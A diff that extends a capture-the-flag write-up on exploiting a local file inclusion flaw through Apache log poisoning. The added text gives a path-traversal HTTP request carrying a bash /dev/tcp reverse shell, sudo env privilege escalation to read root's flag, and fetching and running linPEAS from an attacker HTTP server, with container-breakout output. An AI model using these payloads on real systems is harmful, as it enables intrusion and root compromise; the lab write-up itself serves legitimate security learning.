@@ -104,8 +104,86 @@ One common method to exploit LFI vulnerabilities is log poisonning. For this, we
 ![Screenshot_2023-12-08_20_29_42](https://github.com/elomarii/CTF_4_DAY/assets/106914699/62233aba-1ee3-4977-9435-09672e19054a)
 
 
-Now that we can execute commands on the target machine, let's discover files there.\
+Now that we can execute commands on the target machine, let's first get a reverse shell.\
+We can use Burpsuite to manipulate the http request, the crafted request I used is the following, where the bash command used is `bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'`. Don't forget to started a listener on your machine before sending the request.
+```http
+GET /?view=cats/../../../../var/log/apache2/access.log&ext=&cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/<rhost>/<rport>+<%261' HTTP/1.1
+Host: <machine_ip>
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: nothing
+Connection: close
+Cache-Control: max-age=0
+```
+
 We find the second flag on the parent folder of where the app lives (execute command `ls ..`).
+
+For our next flag, we can try and see if `www-data` (our user) can execute any commands as root with no password. And bang, yes we can:
+```
+www-data@e43f08c3313d:/var/www/html$ sudo -l
+
+Matching Defaults entries for www-data on e43f08c3313d:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on e43f08c3313d:
+    (root) NOPASSWD: /usr/bin/env
+```
+
+We can use `env` to execute commands as root. As a consequence, we enumerate the content of `/root` and find the third flag.
+```
+www-data@e43f08c3313d:/var/www/html$ sudo env cat /root/flag3.txt
+```
+
+As for the last flag, and with respect to the room description, we need to beak out of the docker container running the web app.
+
+The container doesn't appear to have internet connectivity so that we can download files directly and even available commands and binaries are very limited. Thus, to upload our `linPEAS.sh`, 1- we start an http server on the attack machine and 2- we make sure the file is accessible by the server, and finally we use `curl` (luckiliy available on the target machine) to download the script.
+```
+attacker@kali:/$ mkdir http; cp linPEAS.sh http/; cd http
+
+attacker@kali:/http$ sudo python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+<machine_ip> - - [29/Feb/2024 13:50:57] "GET /linPEAS.sh HTTP/1.1" 200 -
+```
+```
+www-data@e43f08c3313d:/var/www/html$ curl http://<rhost>/linPEAS.sh > linPEAS.sh
+
+www-data@e43f08c3313d:/var/www/html$ chmod +x linPEAS.sh
+
+www-data@e43f08c3313d:/var/www/html$ ./linPEAS.sh
+
+<...snip...>
+╔══════════╣ Container & breakout enumeration
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout            
+═╣ Container ID ................... e43f08c3313d═╣ Container Full ID .............. e43f08c3313d3b59dfd6c9b78b723515a60cc9cf08536b6330fcfa6a8fe9b22e
+═╣ Seccomp enabled? ............... enabled
+═╣ AppArmor profile? .............. docker-default (enforce)
+═╣ User proc namespace? ........... enabled         0          0 4294967295
+═╣ Vulnerable to CVE-2019-5021 .... No
+                                                                                              
+══╣ Breakout via mounts
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts                                                    
+═╣ /proc mounted? ................. No                                                        
+═╣ /dev mounted? .................. No                                                        
+═╣ Run unshare .................... No                                                        
+═╣ release_agent breakout 1........ Yes                                                       
+═╣ release_agent breakout 2........ No
+═╣ core_pattern breakout .......... No                                                        
+═╣ binfmt_misc breakout ........... No                                                        
+═╣ uevent_helper breakout ......... No                                                        
+═╣ is modprobe present ............ No                                                        
+═╣ DoS via panic_on_oom ........... No                                                        
+═╣ DoS via panic_sys_fs ........... No                                                        
+═╣ DoS via sysreq_trigger_dos ..... No                                                        
+═╣ /proc/config.gz readable ....... No                                                        
+═╣ /proc/sched_debug readable ..... Yes                                                       
+═╣ /proc/*/mountinfo readable ..... Yes
+═╣ /sys/kernel/security present ... Yes
+═╣ /sys/kernel/security writable .. No
+<...snip...>
+```
+
 
 
 
